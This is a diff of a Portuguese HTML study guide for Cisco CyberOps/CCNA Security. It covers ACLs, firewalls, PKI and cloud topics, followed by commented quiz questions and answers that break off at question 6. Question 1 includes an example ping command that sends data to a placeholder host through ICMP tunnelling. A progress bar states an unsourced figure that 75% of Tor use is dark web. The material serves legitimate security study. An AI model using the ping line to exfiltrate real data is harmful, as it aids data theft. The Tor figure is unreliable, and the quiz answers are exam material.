@@ -2,46 +2,82 @@
 <html lang="pt-br">
   <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, user-scalable=yes"
+    />
     <title>Cisco Security Lab | Guia de Estudos Master</title>
     <!-- Bootstrap 5 CSS (para componentes base, mas estilizado pelo nosso CSS) -->
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" />
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+    />
     <!-- Font Awesome 6 -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
+    />
     <!-- Google Fonts -->
     <link
       href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap"
       rel="stylesheet"
     />
     <link rel="stylesheet" href="../css/styles.css " />
+    <style>
+      .progress {
+        position: sticky;
+        top: 76px;
+        z-index: 1020;
+        border-radius: 0;
+        background-color: var(--bg-secondary);
+        height: 12px;
+      }
+    </style>
   </head>
   <body>
     <!-- Navegação -->
-    <nav class="navbar navbar-expand-lg sticky-top bg-dark border-bottom border-success">
+    <nav
+      class="navbar navbar-expand-lg sticky-top bg-dark border-bottom border-success"
+    >
       <div class="container">
         <a class="navbar-brand" href="#">
           <i class="fas fa-shield-alt me-2"></i>Cisco Security Lab
           <small class="d-block text-muted">Guia Master de Estudos</small>
         </a>
-        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+        <button
+          class="navbar-toggler"
+          type="button"
+          data-bs-toggle="collapse"
+          data-bs-target="#navbarNav"
+        >
           <span class="navbar-toggler-icon"></span>
         </button>
         <div class="collapse navbar-collapse" id="navbarNav">
           <ul class="navbar-nav ms-auto">
             <li class="nav-item">
-              <a class="nav-link" href="#acl"><i class="fas fa-filter"></i> ACLs</a>
+              <a class="nav-link" href="#acl"
+                ><i class="fas fa-filter"></i> ACLs</a
+              >
             </li>
             <li class="nav-item">
-              <a class="nav-link" href="#firewall"><i class="fas fa-fire"></i> Firewalls</a>
+              <a class="nav-link" href="#firewall"
+                ><i class="fas fa-fire"></i> Firewalls</a
+              >
             </li>
             <li class="nav-item">
-              <a class="nav-link" href="#crypto"><i class="fas fa-lock"></i> Criptografia</a>
+              <a class="nav-link" href="#crypto"
+                ><i class="fas fa-lock"></i> Criptografia</a
+              >
             </li>
             <li class="nav-item">
-              <a class="nav-link" href="#cloud"><i class="fas fa-cloud"></i> Nuvem</a>
+              <a class="nav-link" href="#cloud"
+                ><i class="fas fa-cloud"></i> Nuvem</a
+              >
             </li>
             <li class="nav-item">
-              <a class="nav-link" href="#glossario"><i class="fas fa-book"></i> Glossário</a>
+              <a class="nav-link" href="#glossario"
+                ><i class="fas fa-book"></i> Glossário</a
+              >
             </li>
           </ul>
         </div>
@@ -56,26 +92,48 @@
       <!-- Header -->
       <div class="text-center mb-5">
         <h1 class="cisco-title d-inline-block">📘 CyberOps + CCNA Security</h1>
-        <p class="text-muted mt-3">Baseado em 24 questões práticas | Domine ACLs, Firewalls, PKI e muito mais</p>
+        <p class="text-muted mt-3">
+          Baseado em 24 questões práticas | Domine ACLs, Firewalls, PKI e muito
+          mais
+        </p>
       </div>
 
       <!-- ==================== ACL SECTION ==================== -->
       <section id="acl" class="content-section">
-        <h2 class="cisco-title-alt"><i class="fas fa-filter me-2"></i> ACLs - Access Control Lists</h2>
+        <h2 class="cisco-title-alt">
+          <i class="fas fa-filter me-2"></i> ACLs - Access Control Lists
+        </h2>
         <div class="row">
           <div class="col-lg-6">
             <div class="content-card">
-              <h3><i class="fas fa-brain text-success me-2"></i> Conceitos Fundamentais</h3>
+              <h3>
+                <i class="fas fa-brain text-success me-2"></i> Conceitos
+                Fundamentais
+              </h3>
               <ul class="styled-list">
                 <li>
-                  <i class="fas fa-check-circle"></i> <strong>ACL Estendida</strong>: Filtra IP origem, IP destino, protocolo e portas.
+                  <i class="fas fa-check-circle"></i>
+                  <strong>ACL Estendida</strong>: Filtra IP origem, IP destino,
+                  protocolo e portas.
                 </li>
-                <li><i class="fas fa-check-circle"></i> <strong>ACL Padrão</strong>: Filtra apenas IP de origem.</li>
                 <li>
-                  <i class="fas fa-check-circle"></i> <strong>Established</strong>: Permite tráfego TCP com ACK/RST (conexões já abertas).
+                  <i class="fas fa-check-circle"></i>
+                  <strong>ACL Padrão</strong>: Filtra apenas IP de origem.
                 </li>
-                <li><i class="fas fa-check-circle"></i> <strong>Wildcard</strong>: Define intervalo. Ex: 0.0.3.255 = 4 redes (/22).</li>
-                <li><i class="fas fa-check-circle"></i> <strong>Implicit Deny</strong>: Toda ACL termina com "deny any any".</li>
+                <li>
+                  <i class="fas fa-check-circle"></i>
+                  <strong>Established</strong>: Permite tráfego TCP com ACK/RST
+                  (conexões já abertas).
+                </li>
+                <li>
+                  <i class="fas fa-check-circle"></i> <strong>Wildcard</strong>:
+                  Define intervalo. Ex: 0.0.3.255 = 4 redes (/22).
+                </li>
+                <li>
+                  <i class="fas fa-check-circle"></i>
+                  <strong>Implicit Deny</strong>: Toda ACL termina com "deny any
+                  any".
+                </li>
               </ul>
             </div>
           </div>
@@ -84,18 +142,25 @@
               <i class="fas fa-terminal me-2"></i> Exemplo ACL Estendida<br />
               <code
                 >Router(config)# ip access-list extended SECURE<br />
-                Router(config-ext-nacl)# permit tcp any 192.168.254.0 0.0.1.255 established<br />
+                Router(config-ext-nacl)# permit tcp any 192.168.254.0 0.0.1.255
+                established<br />
                 Router(config-ext-nacl)# end</code
               >
               <hr class="bg-success" />
-              <small class="text-muted">✅ Permite apenas tráfego TCP de resposta para a rede 192.168.254.0/23</small>
+              <small class="text-muted"
+                >✅ Permite apenas tráfego TCP de resposta para a rede
+                192.168.254.0/23</small
+              >
             </div>
           </div>
         </div>
 
         <div class="content-card mt-3">
           <h3><i class="fas fa-calculator"></i> Wildcard na Prática</h3>
-          <p><strong>Desafio:</strong> Redes 192.168.16.0, 192.168.17.0, 192.168.18.0, 192.168.19.0</p>
+          <p>
+            <strong>Desafio:</strong> Redes 192.168.16.0, 192.168.17.0,
+            192.168.18.0, 192.168.19.0
+          </p>
           <div class="table-responsive">
             <table class="table-cisco">
               <thead>
@@ -120,25 +185,44 @@
               </tbody>
             </table>
           </div>
-          <div class="alert-cisco mt-2 p-2" style="background: rgba(102, 191, 83, 0.1); border-left: 4px solid #66bf53">
-            <i class="fas fa-lightbulb text-success"></i> <strong>Dica:</strong> Wildcard = 0.0.3.255 → terceiro octeto varia nos 2 últimos
-            bits (00010000 a 00010011)
+          <div
+            class="alert-cisco mt-2 p-2"
+            style="
+              background: rgba(102, 191, 83, 0.1);
+              border-left: 4px solid #66bf53;
+            "
+          >
+            <i class="fas fa-lightbulb text-success"></i>
+            <strong>Dica:</strong> Wildcard = 0.0.3.255 → terceiro octeto varia
+            nos 2 últimos bits (00010000 a 00010011)
           </div>
         </div>
       </section>
 
       <!-- ==================== FIREWALL SECTION ==================== -->
       <section id="firewall" class="content-section">
-        <h2 class="cisco-title-alt"><i class="fas fa-fire me-2"></i> Firewalls: Stateful vs Stateless + ZPF</h2>
+        <h2 class="cisco-title-alt">
+          <i class="fas fa-fire me-2"></i> Firewalls: Stateful vs Stateless +
+          ZPF
+        </h2>
         <div class="row">
           <div class="col-md-6">
             <div class="content-card">
               <h3><i class="fas fa-chart-line"></i> Stateful</h3>
               <ul class="styled-list">
                 <li><i class="fas fa-database"></i> Mantém tabela de estado</li>
-                <li><i class="fas fa-layer-group"></i> Opera nas camadas 3, 4 e 5</li>
-                <li><i class="fas fa-undo-alt"></i> Permite tráfego de retorno automaticamente</li>
-                <li><i class="fas fa-exclamation-triangle"></i> <span class="text-warning">Limitação:</span> Menos eficaz com UDP/ICMP</li>
+                <li>
+                  <i class="fas fa-layer-group"></i> Opera nas camadas 3, 4 e 5
+                </li>
+                <li>
+                  <i class="fas fa-undo-alt"></i> Permite tráfego de retorno
+                  automaticamente
+                </li>
+                <li>
+                  <i class="fas fa-exclamation-triangle"></i>
+                  <span class="text-warning">Limitação:</span> Menos eficaz com
+                  UDP/ICMP
+                </li>
               </ul>
             </div>
           </div>
@@ -146,25 +230,42 @@
             <div class="content-card">
               <h3><i class="fas fa-chart-simple"></i> Stateless</h3>
               <ul class="styled-list">
-                <li><i class="fas fa-box"></i> Analisa pacotes individualmente</li>
-                <li><i class="fas fa-layer-group"></i> Opera nas camadas 3 e 4</li>
-                <li><i class="fas fa-list"></i> Baseado em ACLs tradicionais</li>
-                <li><i class="fas fa-check-circle text-success"></i> Mais simples, mas menos seguro</li>
+                <li>
+                  <i class="fas fa-box"></i> Analisa pacotes individualmente
+                </li>
+                <li>
+                  <i class="fas fa-layer-group"></i> Opera nas camadas 3 e 4
+                </li>
+                <li>
+                  <i class="fas fa-list"></i> Baseado em ACLs tradicionais
+                </li>
+                <li>
+                  <i class="fas fa-check-circle text-success"></i> Mais simples,
+                  mas menos seguro
+                </li>
               </ul>
             </div>
           </div>
         </div>
 
         <div class="content-card">
-          <h3><i class="fas fa-shield-hog"></i> Zone-Based Policy Firewall (ZPF)</h3>
+          <h3>
+            <i class="fas fa-shield-hog"></i> Zone-Based Policy Firewall (ZPF)
+          </h3>
           <div class="row">
             <div class="col-md-4">
               <div class="badge-cisco-alt mb-2">Zona Self</div>
-              <p class="small">Tráfego destinado ao roteador ou originado dele.</p>
+              <p class="small">
+                Tráfego destinado ao roteador ou originado dele.
+              </p>
             </div>
             <div class="col-md-4">
               <div class="badge-cisco-alt mb-2">Ações no ZPF</div>
-              <p><span class="text-success">pass</span> | <span class="text-danger">drop</span> | <span class="text-info">inspect</span></p>
+              <p>
+                <span class="text-success">pass</span> |
+                <span class="text-danger">drop</span> |
+                <span class="text-info">inspect</span>
+              </p>
             </div>
             <div class="col-md-4">
               <div class="badge-cisco-alt mb-2">Primeiro Passo</div>
@@ -176,7 +277,8 @@
             <code
               >zone security INTERNA<br />
               zone security DMZ<br />
-              zone-pair security ZP_INTERNA_DMZ source INTERNA destination DMZ<br />
+              zone-pair security ZP_INTERNA_DMZ source INTERNA destination
+              DMZ<br />
               service-policy type inspect POLICY_INSPECAO</code
             >
           </div>
@@ -185,15 +287,26 @@
 
       <!-- ==================== CRIPTOGRAFIA & PKI ==================== -->
       <section id="crypto" class="content-section">
-        <h2 class="cisco-title-alt"><i class="fas fa-lock me-2"></i> Criptografia e PKI</h2>
+        <h2 class="cisco-title-alt">
+          <i class="fas fa-lock me-2"></i> Criptografia e PKI
+        </h2>
         <div class="row">
           <div class="col-md-6">
             <div class="content-card">
               <h3><i class="fas fa-key"></i> Algoritmos</h3>
               <ul class="styled-list">
-                <li><i class="fas fa-sync-alt"></i> <strong>Simétricos:</strong> AES, 3DES (mesma chave)</li>
-                <li><i class="fas fa-exchange-alt"></i> <strong>Assimétricos:</strong> RSA, ECC (par público/privado)</li>
-                <li><i class="fas fa-hash"></i> <strong>Hash:</strong> MD5, SHA (integridade, não confidencialidade)</li>
+                <li>
+                  <i class="fas fa-sync-alt"></i>
+                  <strong>Simétricos:</strong> AES, 3DES (mesma chave)
+                </li>
+                <li>
+                  <i class="fas fa-exchange-alt"></i>
+                  <strong>Assimétricos:</strong> RSA, ECC (par público/privado)
+                </li>
+                <li>
+                  <i class="fas fa-hash"></i> <strong>Hash:</strong> MD5, SHA
+                  (integridade, não confidencialidade)
+                </li>
               </ul>
             </div>
           </div>
@@ -201,9 +314,18 @@
             <div class="content-card">
               <h3><i class="fas fa-certificate"></i> PKI</h3>
               <ul class="styled-list">
-                <li><i class="fas fa-building"></i> Autoridade Certificadora (CA) → terceiro confiável</li>
-                <li><i class="fas fa-id-card"></i> Certificados digitais = identidade autorizada</li>
-                <li><i class="fas fa-globe"></i> Aplicações: HTTPS, 802.1X/EAP-TLS, VPN SSL</li>
+                <li>
+                  <i class="fas fa-building"></i> Autoridade Certificadora (CA)
+                  → terceiro confiável
+                </li>
+                <li>
+                  <i class="fas fa-id-card"></i> Certificados digitais =
+                  identidade autorizada
+                </li>
+                <li>
+                  <i class="fas fa-globe"></i> Aplicações: HTTPS,
+                  802.1X/EAP-TLS, VPN SSL
+                </li>
               </ul>
             </div>
           </div>
@@ -212,29 +334,50 @@
 
       <!-- ==================== NUVEM & VIRTUALIZAÇÃO ==================== -->
       <section id="cloud" class="content-section">
-        <h2 class="cisco-title-alt"><i class="fas fa-cloud-upload-alt me-2"></i> Segurança em Nuvem e Virtualização</h2>
+        <h2 class="cisco-title-alt">
+          <i class="fas fa-cloud-upload-alt me-2"></i> Segurança em Nuvem e
+          Virtualização
+        </h2>
         <div class="row">
           <div class="col-md-6">
             <div class="content-card">
               <h3><i class="fas fa-server"></i> VM Sprawl</h3>
-              <p><strong>Definição:</strong> Proliferação descontrolada de VMs → mais VMs do que conseguimos gerenciar eficientemente.</p>
-              <div class="alert-cisco mt-2 p-2" style="background: rgba(255, 68, 68, 0.1); border-left-color: #ff4444">
-                <i class="fas fa-exclamation-triangle text-danger"></i> Causa: criação sem controle, falta de remoção após uso.
+              <p>
+                <strong>Definição:</strong> Proliferação descontrolada de VMs →
+                mais VMs do que conseguimos gerenciar eficientemente.
+              </p>
+              <div
+                class="alert-cisco mt-2 p-2"
+                style="
+                  background: rgba(255, 68, 68, 0.1);
+                  border-left-color: #ff4444;
+                "
+              >
+                <i class="fas fa-exclamation-triangle text-danger"></i> Causa:
+                criação sem controle, falta de remoção após uso.
               </div>
             </div>
           </div>
           <div class="col-md-6">
             <div class="content-card">
               <h3><i class="fas fa-microchip"></i> Microsegmentação</h3>
-              <p>Criação de segmentos lógicos isolados sem hardware adicional. Usada em datacenters virtuais e segurança de containers.</p>
               <p>
-                <span class="badge-cisco"><i class="fas fa-check"></i> Benefício: isolamento granular</span>
+                Criação de segmentos lógicos isolados sem hardware adicional.
+                Usada em datacenters virtuais e segurança de containers.
+              </p>
+              <p>
+                <span class="badge-cisco"
+                  ><i class="fas fa-check"></i> Benefício: isolamento
+                  granular</span
+                >
               </p>
             </div>
           </div>
         </div>
         <div class="content-card">
-          <h3><i class="fas fa-cloud"></i> Domínios CSA (Cloud Security Alliance)</h3>
+          <h3>
+            <i class="fas fa-cloud"></i> Domínios CSA (Cloud Security Alliance)
+          </h3>
           <div class="d-flex flex-wrap gap-2">
             <span class="badge-cisco">Segurança de Infraestrutura</span>
             <span class="badge-cisco">Segurança de Aplicações</span>
@@ -246,81 +389,1190 @@
 
       <!-- ==================== GLOSSÁRIO ==================== -->
       <section id="glossario" class="content-section">
-        <h2 class="cisco-title-alt"><i class="fas fa-book-open me-2"></i> Glossário Rápido</h2>
+        <h2 class="cisco-title-alt">
+          <i class="fas fa-book-open me-2"></i> Glossário Rápido
+        </h2>
         <div class="accordion-cisco accordion" id="glossaryAccordion">
           <div class="accordion-item">
             <h2 class="accordion-header">
-              <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapseAcl">
+              <button
+                class="accordion-button"
+                type="button"
+                data-bs-toggle="collapse"
+                data-bs-target="#collapseAcl"
+              >
                 <i class="fas fa-filter me-2"></i> ACL
               </button>
             </h2>
-            <div id="collapseAcl" class="accordion-collapse collapse show" data-bs-parent="#glossaryAccordion">
+            <div
+              id="collapseAcl"
+              class="accordion-collapse collapse show"
+              data-bs-parent="#glossaryAccordion"
+            >
               <div class="accordion-body">
-                Lista de Controle de Acesso. Filtra tráfego baseado em regras. Padrão (só origem) ou Estendida (origem, destino, protocolo,
+                Lista de Controle de Acesso. Filtra tráfego baseado em regras.
+                Padrão (só origem) ou Estendida (origem, destino, protocolo,
                 porta).
               </div>
             </div>
           </div>
           <div class="accordion-item">
             <h2 class="accordion-header">
-              <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseWildcard">
+              <button
+                class="accordion-button collapsed"
+                type="button"
+                data-bs-toggle="collapse"
+                data-bs-target="#collapseWildcard"
+              >
                 <i class="fas fa-calculator me-2"></i> Wildcard Mask
               </button>
             </h2>
             <div id="collapseWildcard" class="accordion-collapse collapse">
               <div class="accordion-body">
-                Máscara usada em ACLs para definir intervalo de endereços. Bit 0 = deve corresponder, bit 1 = pode variar. Ex: 0.0.3.255 = 4
+                Máscara usada em ACLs para definir intervalo de endereços. Bit 0
+                = deve corresponder, bit 1 = pode variar. Ex: 0.0.3.255 = 4
                 redes.
               </div>
             </div>
           </div>
           <div class="accordion-item">
             <h2 class="accordion-header">
-              <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseStateful">
+              <button
+                class="accordion-button collapsed"
+                type="button"
+                data-bs-toggle="collapse"
+                data-bs-target="#collapseStateful"
+              >
                 <i class="fas fa-fire me-2"></i> Stateful Firewall
               </button>
             </h2>
             <div id="collapseStateful" class="accordion-collapse collapse">
-              <div class="accordion-body">Mantém tabela de estado das conexões. Opera nas camadas 3, 4 e 5. Menos eficaz com UDP/ICMP.</div>
+              <div class="accordion-body">
+                Mantém tabela de estado das conexões. Opera nas camadas 3, 4 e
+                5. Menos eficaz com UDP/ICMP.
+              </div>
             </div>
           </div>
           <div class="accordion-item">
             <h2 class="accordion-header">
-              <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseZPF">
+              <button
+                class="accordion-button collapsed"
+                type="button"
+                data-bs-toggle="collapse"
+                data-bs-target="#collapseZPF"
+              >
                 <i class="fas fa-shield-hog me-2"></i> ZPF
               </button>
             </h2>
             <div id="collapseZPF" class="accordion-collapse collapse">
               <div class="accordion-body">
-                Zone-Based Policy Firewall. Modelo moderno do Cisco IOS com zonas de segurança e políticas entre pares de zonas. Zona Self
+                Zone-Based Policy Firewall. Modelo moderno do Cisco IOS com
+                zonas de segurança e políticas entre pares de zonas. Zona Self
                 representa o roteador.
               </div>
             </div>
           </div>
           <div class="accordion-item">
             <h2 class="accordion-header">
-              <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapsePKI">
+              <button
+                class="accordion-button collapsed"
+                type="button"
+                data-bs-toggle="collapse"
+                data-bs-target="#collapsePKI"
+              >
                 <i class="fas fa-certificate me-2"></i> PKI
               </button>
             </h2>
             <div id="collapsePKI" class="accordion-collapse collapse">
               <div class="accordion-body">
-                Infraestrutura de Chave Pública. Emite certificados digitais via CA (Autoridade Certificadora). Usada em HTTPS, 802.1X,
+                Infraestrutura de Chave Pública. Emite certificados digitais via
+                CA (Autoridade Certificadora). Usada em HTTPS, 802.1X,
                 assinaturas digitais.
               </div>
             </div>
           </div>
           <div class="accordion-item">
             <h2 class="accordion-header">
-              <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseAES">
+              <button
+                class="accordion-button collapsed"
+                type="button"
+                data-bs-toggle="collapse"
+                data-bs-target="#collapseAES"
+              >
                 <i class="fas fa-key me-2"></i> AES
               </button>
             </h2>
             <div id="collapseAES" class="accordion-collapse collapse">
               <div class="accordion-body">
-                Advanced Encryption Standard. Algoritmo de criptografia simétrica, usado para confidencialidade.
+                Advanced Encryption Standard. Algoritmo de criptografia
+                simétrica, usado para confidencialidade.
               </div>
             </div>
+          </div>
+        </div>
+      </section>
+      <section class="content-section">
+        <div class="container">
+          <!-- Título da Seção -->
+          <div class="section-badge">
+            <span class="badge-cisco"
+              >📡 ANÁLISE DE TRÁFEGO & MONITORAMENTO</span
+            >
+          </div>
+          <h2 class="cisco-title-gradient">
+            🔍 Masterclass: Questões Comentadas
+          </h2>
+          <p class="text-muted mb-4">
+            Documentação definitiva com explicações profundas sobre cada
+            conceito cobrado nas questões. Material preparado com base no padrão
+            Cisco CyberOps e boas práticas de Blue Team.
+          </p>
+
+          <!-- Questão 1 -->
+          <div class="content-card-gradient mb-4" id="q1">
+            <div
+              class="d-flex justify-content-between align-items-start flex-wrap mb-3"
+            >
+              <h3 class="card-title mb-0">
+                📌 Questão 1: Exfiltração de Dados
+              </h3>
+              <span class="badge-cisco-alt">Táticas de Exfiltração</span>
+            </div>
+            <div class="alert-cisco mb-3">
+              <strong>❓ Pergunta:</strong> Qual método é usado por algum
+              malware para transferir arquivos de hosts infectados para um host
+              de ator de ameaça?
+            </div>
+            <div class="row g-4">
+              <div class="col-md-6">
+                <div class="p-3 bg-secondary bg-opacity-25 rounded-3 h-100">
+                  <h4 class="text-success mb-3">
+                    <i class="fas fa-check-circle"></i> ✅ Resposta Correta
+                  </h4>
+                  <p class="fs-5 fw-bold text-white">túneis ICMP</p>
+                  <p>
+                    <strong>🔬 Por quê?</strong> O túnel ICMP encapsula dados
+                    maliciosos dentro de pacotes de eco (ping). Como muitos
+                    firewalls permitem tráfego ICMP para fins de diagnóstico, os
+                    atacantes abusam desse protocolo para
+                    <strong>exfiltrar dados</strong> sem serem detectados.
+                    Ferramentas como <code>icmpsh</code> ou
+                    <code>Ping Tunnel</code> são exemplos clássicos.
+                  </p>
+                </div>
+              </div>
+              <div class="col-md-6">
+                <div class="p-3 bg-dark rounded-3 h-100">
+                  <h5>
+                    <i class="fas fa-times-circle text-danger"></i> Análise das
+                    Distratores
+                  </h5>
+                  <ul class="styled-list">
+                    <li>
+                      <strong>Injeção iFrame:</strong> Usada para ataques
+                      drive-by-download ou redirecionamento, não para
+                      exfiltração.
+                    </li>
+                    <li>
+                      <strong>Infiltração UDP:</strong> Termo não padronizado;
+                      UDP pode ser usado para C2, mas não é o método primário
+                      descrito.
+                    </li>
+                    <li>
+                      <strong>Criptografia HTTPS:</strong> Protege dados, mas é
+                      um mecanismo de ofuscação, não um método específico de
+                      transferência de arquivos para o atacante.
+                    </li>
+                  </ul>
+                  <div class="mt-3 terminal-card">
+                    <p>
+                      <span class="text-success">$</span> ping -c 1 -p [dados]
+                      alvo.com<br />
+                      <span class="text-muted"
+                        ># Exemplo de encapsulamento ICMP</span
+                      >
+                    </p>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Questão 2 -->
+          <div class="content-card-gradient mb-4" id="q2">
+            <div
+              class="d-flex justify-content-between align-items-start flex-wrap mb-3"
+            >
+              <h3 class="card-title mb-0">📌 Questão 2: Redes P2P</h3>
+              <span class="badge-cisco-alt">Tecnologias Descentralizadas</span>
+            </div>
+            <div class="alert-cisco mb-3">
+              <strong>❓ Pergunta:</strong> Quais duas tecnologias são usadas
+              principalmente em redes ponto a ponto?
+            </div>
+            <div class="row g-4">
+              <div class="col-md-6">
+                <div class="p-3 bg-secondary bg-opacity-25 rounded-3 h-100">
+                  <h4 class="text-success mb-3">
+                    <i class="fas fa-check-circle"></i> ✅ Respostas Corretas
+                  </h4>
+                  <p>
+                    <span class="badge-cisco me-2">Bitcoin</span>
+                    <span class="badge-cisco">BitTorrent</span>
+                  </p>
+                  <p>
+                    <strong>🔬 Por quê?</strong> Ambas operam sem um servidor
+                    central. O <strong>Bitcoin</strong> usa uma rede P2P para
+                    validar transações via consenso distribuído. O
+                    <strong>BitTorrent</strong> fragmenta arquivos e os
+                    distribui entre pares (peers), otimizando o download
+                    coletivo.
+                  </p>
+                </div>
+              </div>
+              <div class="col-md-6">
+                <div class="p-3 bg-dark rounded-3 h-100">
+                  <h5>
+                    <i class="fas fa-database text-info"></i> Contexto Técnico
+                  </h5>
+                  <p>
+                    Em redes P2P, cada nó (peer) atua como cliente e servidor.
+                    Isso elimina gargalos centrais, mas introduz desafios de
+                    segurança, como a propagação de malware via torrents
+                    fraudulentos.
+                  </p>
+                  <div class="ioc-grid mt-2">
+                    <div>
+                      🔗 <strong>BitTorrent:</strong> DHT (Distributed Hash
+                      Table)
+                    </div>
+                    <div>
+                      💰 <strong>Bitcoin:</strong> Blockchain + Proof of Work
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Questão 3 -->
+          <div class="content-card-gradient mb-4" id="q3">
+            <div
+              class="d-flex justify-content-between align-items-start flex-wrap mb-3"
+            >
+              <h3 class="card-title mb-0">
+                📌 Questão 3: Disfarce de Exploração
+              </h3>
+              <span class="badge-cisco-alt">Evasão & Persistência</span>
+            </div>
+            <div class="alert-cisco mb-3">
+              <strong>❓ Pergunta:</strong> Que técnica um ator ameaçador usaria
+              para disfarçar vestígios de uma exploração em curso?
+            </div>
+            <div class="row g-4">
+              <div class="col-md-6">
+                <div class="p-3 bg-secondary bg-opacity-25 rounded-3 h-100">
+                  <h4 class="text-success mb-3">
+                    <i class="fas fa-check-circle"></i> ✅ Resposta Correta
+                  </h4>
+                  <p class="fs-5 fw-bold text-white">
+                    Encapsular outros protocolos dentro do DNS
+                  </p>
+                  <p>
+                    <strong>🔬 Por quê?</strong> O <strong>Túnel DNS</strong> é
+                    uma técnica furtiva que embute dados maliciosos em
+                    consultas/respostas DNS. Como o DNS é essencial para a
+                    navegação e geralmente não é inspecionado profundamente, o
+                    atacante pode estabelecer C2 (Comando e Controle) e
+                    exfiltrar dados sem levantar suspeitas.
+                  </p>
+                </div>
+              </div>
+              <div class="col-md-6">
+                <div class="p-3 bg-dark rounded-3 h-100">
+                  <h5>
+                    <i class="fas fa-eye-slash text-warning"></i> Outras
+                    Técnicas
+                  </h5>
+                  <ul class="styled-list">
+                    <li>
+                      <strong>iFrame invisível:</strong> Usado para redirecionar
+                      vítimas ou baixar malware, mas não para apagar rastros.
+                    </li>
+                    <li>
+                      <strong>Ataque NTP:</strong> Manipula timestamps,
+                      dificultando correlação de logs, mas é menos comum que o
+                      túnel DNS.
+                    </li>
+                    <li>
+                      <strong>SSL/TLS:</strong> Embora ofusque, tráfego
+                      criptografado em excesso pode ser um indicador de anomalia
+                      em redes corporativas.
+                    </li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Questão 4 -->
+          <div class="content-card-gradient mb-4" id="q4">
+            <div
+              class="d-flex justify-content-between align-items-start flex-wrap mb-3"
+            >
+              <h3 class="card-title mb-0">📌 Questão 4: Propósito do Tor</h3>
+              <span class="badge-cisco-alt">Anonimato Online</span>
+            </div>
+            <div class="alert-cisco mb-3">
+              <strong>❓ Pergunta:</strong> Qual é o propósito do Tor?
+            </div>
+            <div class="row g-4">
+              <div class="col-md-6">
+                <div class="p-3 bg-secondary bg-opacity-25 rounded-3 h-100">
+                  <h4 class="text-success mb-3">
+                    <i class="fas fa-check-circle"></i> ✅ Resposta Correta
+                  </h4>
+                  <p class="fs-5 fw-bold text-white">
+                    Permitir que os usuários naveguem na Internet anonimamente
+                  </p>
+                  <p>
+                    <strong>🔬 Por quê?</strong> O
+                    <strong>The Onion Router (Tor)</strong> roteia o tráfego
+                    através de uma rede de relays voluntários, criptografando os
+                    dados em camadas (como uma cebola). Isso oculta o IP do
+                    usuário, garantindo <strong>anonimato</strong> contra
+                    vigilância e análise de tráfego.
+                  </p>
+                </div>
+              </div>
+              <div class="col-md-6">
+                <div class="p-3 bg-dark rounded-3 h-100">
+                  <h5>
+                    <i class="fas fa-layer-group"></i> Funcionamento Básico
+                  </h5>
+                  <p>
+                    1. Cliente -> Nó de Entrada -> Nó Intermediário -> Nó de
+                    Saída -> Destino.<br />
+                    Nenhum nó conhece o caminho completo, garantindo anonimato.
+                  </p>
+                  <div class="progress mt-2 mb-2">
+                    <div class="progress-bar bg-success" style="width: 75%">
+                      Uso comum: 75% dark web
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Questão 5 -->
+          <div class="content-card-gradient mb-4" id="q5">
+            <div
+              class="d-flex justify-content-between align-items-start flex-wrap mb-3"
+            >
+              <h3 class="card-title mb-0">📌 Questão 5: Mapeamento de Rede</h3>
+              <span class="badge-cisco-alt">Fase de Reconhecimento</span>
+            </div>
+            <div class="alert-cisco mb-3">
+              <strong>❓ Pergunta:</strong> Que tipo de ataque determina quais
+              IPs, protocolos e portas são permitidos pelas ACLs?
+            </div>
+            <div class="row g-4">
+              <div class="col-md-6">
+                <div class="p-3 bg-secondary bg-opacity-25 rounded-3 h-100">
+                  <h4 class="text-success mb-3">
+                    <i class="fas fa-check-circle"></i> ✅ Resposta Correta
+                  </h4>
+                  <p class="fs-5 fw-bold text-white">Reconhecimento</p>
+                  <p>
+                    <strong>🔬 Por quê?</strong> O
+                    <strong>Reconhecimento (Footprinting)</strong> é a fase
+                    inicial do Cyber Kill Chain. Ferramentas como
+                    <strong>Nmap</strong> ou <strong>Masscan</strong> são usadas
+                    para varrer a rede, identificar portas abertas, serviços
+                    ativos e regras de firewall (ACLs), preparando o terreno
+                    para o ataque.
+                  </p>
+                </div>
+              </div>
+              <div class="col-md-6">
+                <div class="p-3 bg-dark rounded-3 h-100">
+                  <h5><i class="fas fa-shield-alt"></i> Contramedidas</h5>
+                  <ul class="styled-list">
+                    <li>
+                      Configurar sistemas de detecção de varredura (Port Scan
+                      Detection).
+                    </li>
+                    <li>Limitar respostas ICMP.</li>
+                    <li>
+                      Utilizar honeypots para identificar atacantes em fase de
+                      reconhecimento.
+                    </li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Questão 6 -->
+          <div class="content-card-gradient mb-4" id="q6">
+            <div
+              class="d-flex justify-content-between align-items-start flex-wrap mb-3"
+            >
+              <h3 class="card-title mb-0">
+                📌 Questão 6: Análise Retrospectiva
+              </h3>
+              <span class="badge-cisco-alt">Hunting & Forense</span>
+            </div>
+            <div class="alert-cisco mb-3">
